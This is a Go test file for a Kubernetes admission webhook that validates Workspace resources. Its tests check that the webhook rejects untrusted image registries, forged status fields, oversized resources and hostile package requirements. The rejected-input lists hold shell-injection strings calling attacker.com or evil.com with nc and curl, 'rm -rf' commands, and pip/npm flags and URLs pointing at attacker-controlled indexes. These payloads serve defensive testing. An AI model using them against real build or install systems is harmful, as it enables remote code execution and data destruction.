// Copyright (C) 2026 Michael Kao
// SPDX-License-Identifier: AGPL-3.0-or-later

package webhooks

import (
	"context"
	"encoding/json"
	"regexp"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	admissionv1 "k8s.io/api/admission/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"sigs.k8s.io/controller-runtime/pkg/webhook/admission"

	v1 "github.com/lenaxia/llmsafespaces/pkg/apis/llmsafespaces/v1"
	"github.com/lenaxia/llmsafespaces/pkg/settings"
)

// =============================================================================
// G2 — Workspace admission webhook (closes F1.2.1, F1.2.2, RT-2.18, RT-6.10, RT-6.1)
// =============================================================================
//
// The Workspace CRD shipped with no validating webhook. Phase 1 reconnaissance
// (F1.2.1) and Phase 2 live-cluster (RT-2.18) demonstrated that a user could
// CREATE a Workspace with `runtime: "evil.example.com/malicious:latest"` and
// the controller would pull and run that image. Same vector for the Status
// subresource (F1.2.2): a user with `workspaces` create/update could write
// `status.podIP="10.0.0.1"` on CREATE and the controller would happily proxy
// requests to that arbitrary IP.
//
// This test suite drives a new WorkspaceValidator that:
//   1. Rejects explicit image references whose registry is not in an
//      operator-supplied allow-list.
//   2. Rejects runtimes containing path-traversal / NUL / backslash.
//   3. Rejects storage.size above an operator-supplied maximum.
//   4. Rejects a non-empty Status block on CREATE.
//   5. Rejects a Spec change to status fields on UPDATE (defense in depth;
//      kube-apiserver's status subresource also enforces this).
//
// All tests use the same admission.Decoder helper from webhooks_test.go.

func newWorkspaceCreateRequest(t *testing.T, ws *v1.Workspace) admission.Request {
	t.Helper()
	raw, err := json.Marshal(ws)
	require.NoError(t, err)
	return admission.Request{
		AdmissionRequest: admissionv1.AdmissionRequest{
			Operation: admissionv1.Create,
			Namespace: "default",
			Object:    runtime.RawExtension{Raw: raw},
		},
	}
}

func newWorkspaceUpdateRequest(t *testing.T, oldWs, newWs *v1.Workspace) admission.Request {
	t.Helper()
	rawOld, err := json.Marshal(oldWs)
	require.NoError(t, err)
	rawNew, err := json.Marshal(newWs)
	require.NoError(t, err)
	return admission.Request{
		AdmissionRequest: admissionv1.AdmissionRequest{
			Operation: admissionv1.Update,
			Namespace: "default",
			Object:    runtime.RawExtension{Raw: rawNew},
			OldObject: runtime.RawExtension{Raw: rawOld},
		},
	}
}

// minimalValidWorkspace returns a Workspace that should pass the validator
// when the registry allow-list contains no images (i.e. operator only allows
// runtime references resolved via RuntimeEnvironment CRDs by name).
func minimalValidWorkspace() *v1.Workspace {
	return &v1.Workspace{
		TypeMeta:   metav1.TypeMeta{APIVersion: "llmsafespaces.dev/v1", Kind: "Workspace"},
		ObjectMeta: metav1.ObjectMeta{Name: "ws-1", Namespace: "default"},
		Spec: v1.WorkspaceSpec{
			Owner:   v1.WorkspaceOwner{UserID: "u1"},
			Runtime: "python-3.11", // referenced by RuntimeEnvironment name
			Storage: v1.WorkspaceStorageConfig{Size: "5Gi"},
		},
	}
}

// --- F1.2.1 / RT-2.18 / RT-6.10: registry allow-list ---

func TestG2Workspace_DeniesArbitraryRegistry(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/lenaxia/", "registry.k8s.io/"},
		MaxStorageGi:           1024,
	}
	ws := minimalValidWorkspace()
	ws.Spec.Runtime = "evil.example.com/malicious:latest"
	resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
	assert.False(t, resp.Allowed)
	require.NotNil(t, resp.Result)
	assert.Contains(t, strings.ToLower(resp.Result.Message), "runtime")
	assert.Contains(t, strings.ToLower(resp.Result.Message), "registry")
}

func TestG2Workspace_AllowsAllowlistedRegistry(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/lenaxia/", "registry.k8s.io/"},
		MaxStorageGi:           1024,
	}
	ws := minimalValidWorkspace()
	ws.Spec.Runtime = "ghcr.io/lenaxia/llmsafespaces/runtime-python:3.11"
	resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
	assert.True(t, resp.Allowed, "allow-listed registry must pass: %v", resp.Result)
}

func TestG2Workspace_AllowsRuntimeEnvironmentRefByName(t *testing.T) {
	// "python-3.11" has no '/' so it's a RuntimeEnvironment name lookup at
	// reconcile time, not a direct image. The webhook can't verify the
	// RuntimeEnvironment exists (cluster I/O during admission is risky),
	// so it simply accepts non-image-shaped runtimes.
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: nil, // no allow-list → block ALL explicit images
		MaxStorageGi:           1024,
	}
	ws := minimalValidWorkspace()
	ws.Spec.Runtime = "python-3.11"
	resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
	assert.True(t, resp.Allowed, "RuntimeEnvironment-name reference must pass: %v", resp.Result)
}

func TestG2Workspace_DeniesEmptyRuntime(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	ws := minimalValidWorkspace()
	ws.Spec.Runtime = ""
	resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
	assert.False(t, resp.Allowed)
	assert.Contains(t, strings.ToLower(resp.Result.Message), "runtime")
}

// --- RT-6.1: traversal characters in runtime ---

func TestG2Workspace_DeniesTraversalRuntime(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	for _, payload := range []string{
		"../../etc/passwd",
		"ghcr.io/../../../etc/passwd",
		"runtime\x00null",
		"runtime\\backslash",
		"runtime with space",
		"evil.example.com:65535/img@sha256:" + strings.Repeat("a", 64), // un-allow-listed registry; explicit reject
	} {
		t.Run(payload, func(t *testing.T) {
			ws := minimalValidWorkspace()
			ws.Spec.Runtime = payload
			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
			assert.False(t, resp.Allowed,
				"runtime payload %q must be rejected", payload)
		})
	}
}

// --- RT-6.1: storage upper bound ---

func TestG2Workspace_DeniesAbsurdStorageSize(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	ws := minimalValidWorkspace()
	ws.Spec.Storage.Size = "999999Gi"
	resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
	assert.False(t, resp.Allowed)
	assert.Contains(t, strings.ToLower(resp.Result.Message), "storage")
}

func TestG2Workspace_AllowsBoundedStorageSize(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	for _, size := range []string{"1Gi", "100Gi", "1024Gi", "256Mi"} {
		ws := minimalValidWorkspace()
		ws.Spec.Storage.Size = size
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.True(t, resp.Allowed,
			"storage %s must pass: %v", size, resp.Result)
	}
}

func TestG2Workspace_DeniesMalformedStorageSize(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	for _, size := range []string{"", "huge", "1TB", "-5Gi", "5GB"} {
		t.Run(size, func(t *testing.T) {
			ws := minimalValidWorkspace()
			ws.Spec.Storage.Size = size
			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
			assert.False(t, resp.Allowed,
				"storage size %q must be rejected", size)
		})
	}
}

// --- F1.2.9: storageClassName allow-list ---

func TestG2Workspace_DeniesUnallowedStorageClass(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                  admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries:   []string{"ghcr.io/"},
		MaxStorageGi:             1024,
		AllowedStorageClassNames: []string{"longhorn", "gp3"},
	}
	ws := minimalValidWorkspace()
	ws.Spec.Storage.StorageClassName = "host-path-attacker"
	resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
	assert.False(t, resp.Allowed)
	assert.Contains(t, strings.ToLower(resp.Result.Message), "storageclass")
}

func TestG2Workspace_AllowsAllowedStorageClass(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                  admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries:   []string{"ghcr.io/"},
		MaxStorageGi:             1024,
		AllowedStorageClassNames: []string{"longhorn", "gp3"},
	}
	ws := minimalValidWorkspace()
	ws.Spec.Storage.StorageClassName = "longhorn"
	resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
	assert.True(t, resp.Allowed, "allow-listed storage class must pass: %v", resp.Result)
}

func TestG2Workspace_AllowsEmptyStorageClass_WhenAllowlistConfigured(t *testing.T) {
	// Empty StorageClassName means "use cluster default" — that is the
	// operator's choice and is always permitted, even with an allow-list.
	v := &WorkspaceValidator{
		Decoder:                  admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries:   []string{"ghcr.io/"},
		MaxStorageGi:             1024,
		AllowedStorageClassNames: []string{"longhorn"},
	}
	ws := minimalValidWorkspace()
	ws.Spec.Storage.StorageClassName = ""
	resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
	assert.True(t, resp.Allowed, "empty storage class must default-pass: %v", resp.Result)
}

// --- F1.2.2: status forge on CREATE ---

func TestG2Workspace_DeniesNonEmptyStatusOnCreate(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	for _, mutate := range []func(*v1.Workspace){
		func(w *v1.Workspace) { w.Status.Phase = v1.WorkspacePhaseActive },
		func(w *v1.Workspace) { w.Status.PodIP = "169.254.169.254" },
		func(w *v1.Workspace) { w.Status.PodName = "attacker-pod" },
		func(w *v1.Workspace) { w.Status.PodNamespace = "kube-system" },
		func(w *v1.Workspace) { w.Status.Endpoint = "http://attacker.example.com" },
	} {
		ws := minimalValidWorkspace()
		mutate(ws)
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.False(t, resp.Allowed,
			"non-empty status on CREATE must be rejected (mutated field)")
		if resp.Result != nil {
			assert.Contains(t, strings.ToLower(resp.Result.Message), "status",
				"rejection reason must mention 'status'")
		}
	}
}

// --- F1.2.2: status forge on UPDATE through the spec endpoint ---

func TestG2Workspace_DeniesStatusFieldChangeOnSpecUpdate(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	oldWs := minimalValidWorkspace()
	oldWs.Status.PodIP = "10.0.0.1" // legitimately set by controller
	newWs := oldWs.DeepCopy()
	newWs.Status.PodIP = "169.254.169.254" // attacker forge

	resp := v.Handle(context.Background(), newWorkspaceUpdateRequest(t, oldWs, newWs))
	assert.False(t, resp.Allowed,
		"changes to .status fields on UPDATE through the spec endpoint must be rejected")
}

// --- F1.2.2: spec UPDATE that doesn't touch status passes ---

func TestG2Workspace_AllowsSpecOnlyUpdate(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	oldWs := minimalValidWorkspace()
	oldWs.Status.PodIP = "10.0.0.1"
	newWs := oldWs.DeepCopy()
	newWs.Spec.Storage.Size = "20Gi"

	resp := v.Handle(context.Background(), newWorkspaceUpdateRequest(t, oldWs, newWs))
	assert.True(t, resp.Allowed,
		"spec-only update must pass: %v", resp.Result)
}

// --- Defense in depth: nil-decoder doesn't panic ---

func TestG2Workspace_NilDecoderDoesNotPanic(t *testing.T) {
	v := &WorkspaceValidator{Decoder: nil}
	defer func() {
		if r := recover(); r != nil {
			t.Fatalf("nil-decoder webhook must not panic, got: %v", r)
		}
	}()
	resp := v.Handle(context.Background(), admission.Request{})
	assert.False(t, resp.Allowed)
}

// --- Validator follow-up: UPDATE with empty OldObject ---

// TestG2Workspace_UpdateWithEmptyOldObjectFailsClosed proves the fix
// for the validator-found bypass: an UPDATE request with no
// req.OldObject.Raw used to silently skip the status-mutation check.
// We now fail closed — any non-zero status on the new object during
// such an UPDATE is rejected as if the prior status were zero.
func TestG2Workspace_UpdateWithEmptyOldObjectFailsClosed(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	newWs := minimalValidWorkspace()
	newWs.Status.PodIP = "169.254.169.254"

	rawNew, err := json.Marshal(newWs)
	require.NoError(t, err)

	req := admission.Request{
		AdmissionRequest: admissionv1.AdmissionRequest{
			Operation: admissionv1.Update,
			Namespace: "default",
			Object:    runtime.RawExtension{Raw: rawNew},
			// OldObject deliberately empty — covers the bypass path.
		},
	}
	resp := v.Handle(context.Background(), req)
	assert.False(t, resp.Allowed,
		"UPDATE with empty OldObject and non-zero new status must be rejected")
}

func TestG2Workspace_UpdateWithEmptyOldObjectAndZeroStatusPasses(t *testing.T) {
	// Same code path, but with zero status the operation is benign.
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	newWs := minimalValidWorkspace()
	rawNew, err := json.Marshal(newWs)
	require.NoError(t, err)

	req := admission.Request{
		AdmissionRequest: admissionv1.AdmissionRequest{
			Operation: admissionv1.Update,
			Namespace: "default",
			Object:    runtime.RawExtension{Raw: rawNew},
		},
	}
	resp := v.Handle(context.Background(), req)
	assert.True(t, resp.Allowed,
		"UPDATE with empty OldObject and zero status must pass: %v", resp.Result)
}

// --- Validator follow-up: length caps ---

func TestG2Workspace_DeniesRuntimeOver512Chars(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	ws := minimalValidWorkspace()
	ws.Spec.Runtime = "ghcr.io/" + strings.Repeat("a", 510)
	resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
	assert.False(t, resp.Allowed)
	if resp.Result != nil {
		assert.Contains(t, strings.ToLower(resp.Result.Message), "length")
	}
}

func TestG2Workspace_DeniesStorageClassNameOver253Chars(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	ws := minimalValidWorkspace()
	ws.Spec.Storage.StorageClassName = strings.Repeat("a", 254)
	resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
	assert.False(t, resp.Allowed)
}

// --- Validator follow-up: allow-list prefix without trailing slash ---

// TestG2Workspace_AllowlistPrefixWithoutSlashIsNormalized proves the
// validator-found misconfiguration class. Operator writes
// "ghcr.io/lenaxia" (no slash) in values.yaml; we treat it as
// "ghcr.io/lenaxia/" so an attacker cannot smuggle
// "ghcr.io/lenaxia.attacker.com/foo" past the prefix match.
func TestG2Workspace_AllowlistPrefixWithoutSlashIsNormalized(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/lenaxia"}, // no trailing slash
		MaxStorageGi:           1024,
	}
	// Legitimate ghcr.io/lenaxia/... still passes because we normalise
	// the prefix to add the slash.
	t.Run("legitimate match still passes", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Runtime = "ghcr.io/lenaxia/runtime:1.0"
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.True(t, resp.Allowed,
			"normalised prefix should match legitimate use: %v", resp.Result)
	})
	// Attempt to smuggle via suffix attack on the prefix.
	t.Run("prefix-suffix homograph is rejected", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Runtime = "ghcr.io/lenaxia.attacker.com/foo"
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.False(t, resp.Allowed,
			"slash-normalised prefix must reject suffix attack")
	})
}

// =============================================================================
// G4 (F1.2.5) — Spec.Packages[].Requirements[] shell-injection guard
// =============================================================================
//
// Pre-fix the controller built `pip install --target=... <req>` by
// string concatenation, so a requirement like "pkg; rm -rf /" got
// shell execution in the init container. The webhook is the primary
// admission control; the controller-side shell-quoting (in
// buildWorkspaceSetupScript) is defense-in-depth.

func TestG4_F125_RejectsShellInjectionInRequirements(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	for _, payload := range []string{
		"requests; rm -rf /workspace",
		"requests | nc attacker.com 9999",
		"requests && curl evil.com",
		"requests`whoami`",
		"requests$(whoami)",
		"requests > /etc/passwd",
		"requests\nrm -rf /",
		"requests\trm -rf /",
		"requests\\malicious",
		"requests'malicious",
		"requests\"malicious",
		"requests with spaces",
		"requests\x00null",
		"../../../etc/passwd",
	} {
		t.Run(payload, func(t *testing.T) {
			ws := minimalValidWorkspace()
			ws.Spec.Packages = []v1.WorkspacePackageSet{
				{Runtime: "python:3.11", Requirements: []string{payload}},
			}
			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
			assert.False(t, resp.Allowed,
				"adversarial requirement %q must be rejected", payload)
		})
	}
}

func TestG4_F125_AllowsLegitimateRequirements(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	for _, req := range []string{
		"requests",
		"requests==2.31.0",
		"requests>=2.0,<3.0",
		"requests~=2.31",
		"requests[security]==2.31.0",
		"@scope/package",
		"@scope/package@1.2.3",
		"github.com/spf13/cobra",
		"github.com/spf13/cobra@v1.8.0",
		"torch==2.1.0+cu118",
		"package_underscore",
		"package-with-dash",
		"a.b.c",
	} {
		t.Run(req, func(t *testing.T) {
			ws := minimalValidWorkspace()
			ws.Spec.Packages = []v1.WorkspacePackageSet{
				{Runtime: "python:3.11", Requirements: []string{req}},
			}
			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
			assert.True(t, resp.Allowed,
				"legitimate requirement %q must pass: %v", req, resp.Result)
		})
	}
}

func TestG4_F125_RejectsEmptyAndOverlongRequirements(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	for name, payload := range map[string]string{
		"empty":      "",
		"all-spaces": "   ",
		"overlong":   strings.Repeat("a", 257),
	} {
		t.Run(name, func(t *testing.T) {
			ws := minimalValidWorkspace()
			ws.Spec.Packages = []v1.WorkspacePackageSet{
				{Runtime: "python:3.11", Requirements: []string{payload}},
			}
			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
			assert.False(t, resp.Allowed)
		})
	}
}

// =============================================================================
// G4 — additional bypass classes from validator pass 2 (worklog 0098)
// =============================================================================

func TestG4_F125_RejectsArgvInjectionFlags(t *testing.T) {
	// Validator-found bypass class: requirements that pass the
	// shell-metachar regex but contain pip/npm/go-install flags
	// that redirect the package manager to attacker resources (RCE).
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	for _, payload := range []string{
		"--index-url=http://attacker.com/pypi",
		"--extra-index-url=http://attacker",
		"-r/etc/passwd",
		"-rrequirements.txt",
		"--target=/etc",
		"--registry=http://attacker.com",
		"-toolexec=/usr/bin/curl",
		"-",  // bare dash
		"--", // bare double dash
	} {
		t.Run(payload, func(t *testing.T) {
			ws := minimalValidWorkspace()
			ws.Spec.Packages = []v1.WorkspacePackageSet{
				{Runtime: "python:3.11", Requirements: []string{payload}},
			}
			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
			assert.False(t, resp.Allowed,
				"argv-injection payload %q must be rejected (F1.2.5 validator pass 2)", payload)
		})
	}
}

func TestG4_F125_RejectsURLAndPathRequirements(t *testing.T) {
	// Validator-found bypass class: VCS / URL / file-path installs
	// give pip / npm direct RCE via attacker setup.py / preinstall.
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	for _, payload := range []string{
		"git+https://attacker.com/repo.git",
		"git+https://attacker.com/repo.git@v1.0",
		"git+ssh://attacker.com/repo.git",
		"https://attacker.com/evil.tar.gz",
		"http://attacker.com/evil.whl",
		"ftp://attacker.com/x",
		"file:///etc/passwd",
		"file://./pkg.tar.gz",
		"./relative-path",
		"../parent-path",
		"/absolute/path",
		"svn+https://attacker/r",
		"hg+https://attacker/r",
	} {
		t.Run(payload, func(t *testing.T) {
			ws := minimalValidWorkspace()
			ws.Spec.Packages = []v1.WorkspacePackageSet{
				{Runtime: "python:3.11", Requirements: []string{payload}},
			}
			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
			assert.False(t, resp.Allowed,
				"URL/path payload %q must be rejected (F1.2.5 validator pass 2)", payload)
		})
	}
}

func TestG4_F123_WebhookCapsCPUAndMemory(t *testing.T) {
	// Validator-found surface: spec.resources.* could declare
	// 999999999m and stay Pending forever. Webhook caps prevent it.
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
		MaxCPUMillicores:       16000,
		MaxMemoryMi:            65536,
	}
	t.Run("cpu over cap", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Resources = &v1.ResourceRequirements{CPU: "20000m"}
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.False(t, resp.Allowed)
	})
	t.Run("memory over cap", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Resources = &v1.ResourceRequirements{Memory: "100Gi"}
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.False(t, resp.Allowed)
	})
	t.Run("at cap is allowed", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Resources = &v1.ResourceRequirements{
			CPU:    "16000m",
			Memory: "65536Mi",
		}
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.True(t, resp.Allowed, "%v", resp.Result)
	})

	// Drift guard for the denial-message strings. The reviewer caught
	// a previous round where the regex was tightened to [1-9][0-9]*
	// but the user-facing error string still said [0-9]+ — actively
	// misleading because "0Gi" *does* match the old [0-9]+ pattern,
	// sending an operator on a wild goose chase. Pin the message
	// content so a future regex change without an error-string
	// update fails this test.
	t.Run("0Gi memory: denial message references current regex", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Resources = &v1.ResourceRequirements{Memory: "0Gi"}
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.False(t, resp.Allowed, "0Gi must be rejected (zero magnitude)")
		require.NotNil(t, resp.Result, "denial must have a Result message")
		msg := resp.Result.Message
		// The message must reflect the current regex, not the old one.
		// Specifically: the rejection of "0Gi" must reference a regex
		// that genuinely excludes "0Gi" (i.e. requires positive
		// magnitude). The old message "[0-9]+(Ki|Mi|Gi)" was wrong
		// because "0Gi" matches it; the new message contains [1-9].
		assert.Contains(t, msg, "[1-9]",
			"denial message must reflect the current [1-9][0-9]* magnitude rule; "+
				"got %q (regex was tightened but message wasn't updated?)", msg)
		assert.NotContains(t, msg, "^[0-9]+(Ki|Mi|Gi)$",
			"denial message contains the old regex literal; webhook regex was "+
				"tightened to [1-9][0-9]* but the error string still claims [0-9]+. "+
				"This is the exact stale-message bug the reviewer flagged on PR #269.")
	})
	t.Run("0Gi storage: denial message references current regex", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Storage.Size = "0Gi"
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.False(t, resp.Allowed, "storage 0Gi must be rejected")
		require.NotNil(t, resp.Result)
		msg := resp.Result.Message
		assert.Contains(t, msg, "[1-9]",
			"storage denial message must reflect [1-9][0-9]* rule; got %q", msg)
		assert.NotContains(t, msg, "^[0-9]+(Gi|Mi)$",
			"storage denial message still references the old regex literal")
	})
}

// =============================================================================
// G4 part 2 — F1.2.4: Spec.NetworkAccess.Egress[].Domain validation
// =============================================================================

func TestG4_F124_RejectsClusterInternalDomain(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	for _, payload := range []string{
		"kubernetes.default.svc.cluster.local",
		"prometheus.monitoring.svc.cluster.local",
		"redis-master.default.svc",
		"any.local",
		"my-app.internal",
		"my-app.cluster.local.",
	} {
		t.Run(payload, func(t *testing.T) {
			ws := minimalValidWorkspace()
			ws.Spec.NetworkAccess = &v1.WorkspaceNetworkAccess{
				Egress: []v1.WorkspaceEgressRule{{Domain: payload}},
			}
			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
			assert.False(t, resp.Allowed,
				"cluster-internal domain %q must be rejected", payload)
		})
	}
}

func TestG4_F124_RejectsIPLiteralDomain(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	for _, payload := range []string{
		"169.254.169.254",
		"10.0.0.1",
		"127.0.0.1",
		"::1",
		"fe80::1",
	} {
		t.Run(payload, func(t *testing.T) {
			ws := minimalValidWorkspace()
			ws.Spec.NetworkAccess = &v1.WorkspaceNetworkAccess{
				Egress: []v1.WorkspaceEgressRule{{Domain: payload}},
			}
			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
			assert.False(t, resp.Allowed,
				"IP literal %q must be rejected as a domain", payload)
		})
	}
}

func TestG4_F124_AllowsLegitimatePublicDomains(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	for _, d := range []string{
		"api.openai.com",
		"api.anthropic.com",
		"github.com",
		"objects.githubusercontent.com",
		"a-b-c.example.org",
	} {
		t.Run(d, func(t *testing.T) {
			ws := minimalValidWorkspace()
			ws.Spec.NetworkAccess = &v1.WorkspaceNetworkAccess{
				Egress: []v1.WorkspaceEgressRule{{Domain: d}},
			}
			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
			assert.True(t, resp.Allowed,
				"legitimate public domain %q must pass: %v", d, resp.Result)
		})
	}
}

func TestG4_F124_RejectsMalformedDomains(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
	}
	for _, payload := range []string{
		"",
		"  ",
		"-leading-dash.example.com",
		"trailing-dash-.example.com",
		"has spaces.example.com",
		"has;semicolon.example.com",
		"localhost", // no TLD
	} {
		t.Run(payload, func(t *testing.T) {
			ws := minimalValidWorkspace()
			ws.Spec.NetworkAccess = &v1.WorkspaceNetworkAccess{
				Egress: []v1.WorkspaceEgressRule{{Domain: payload}},
			}
			resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
			assert.False(t, resp.Allowed,
				"malformed domain %q must be rejected", payload)
		})
	}
}

// =============================================================================
// US-24.3: Burstable QoS — limit validation
// =============================================================================

func TestUS243_WebhookRejectsLimitBelowRequest(t *testing.T) {
	v := &WorkspaceValidator{
		Decoder:                admission.NewDecoder(newScheme(t)),
		AllowedImageRegistries: []string{"ghcr.io/"},
		MaxStorageGi:           1024,
		MaxCPUMillicores:       16000,
		MaxMemoryMi:            65536,
	}
	t.Run("cpuLimit below cpu request", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Resources = &v1.ResourceRequirements{CPU: "1000m", CPULimit: "500m"}
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.False(t, resp.Allowed)
		assert.Contains(t, resp.Result.Message, "cpuLimit")
	})
	t.Run("memoryLimit below memory request", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Resources = &v1.ResourceRequirements{Memory: "2Gi", MemoryLimit: "1Gi"}
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.False(t, resp.Allowed)
		assert.Contains(t, resp.Result.Message, "memoryLimit")
	})
	t.Run("limit equals request is allowed", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Resources = &v1.ResourceRequirements{CPU: "500m", CPULimit: "500m", Memory: "512Mi", MemoryLimit: "512Mi"}
		resp := v.Handle(context.Background(), newWorkspaceCreateRequest(t, ws))
		assert.True(t, resp.Allowed, "%v", resp.Result)
	})
	t.Run("limit above request is allowed", func(t *testing.T) {
		ws := minimalValidWorkspace()
		ws.Spec.Resources = &v1.ResourceRequirements{CPU: "500m", CPULimit: "2000m", Memory: "512Mi", MemoryLimit: "2Gi"}
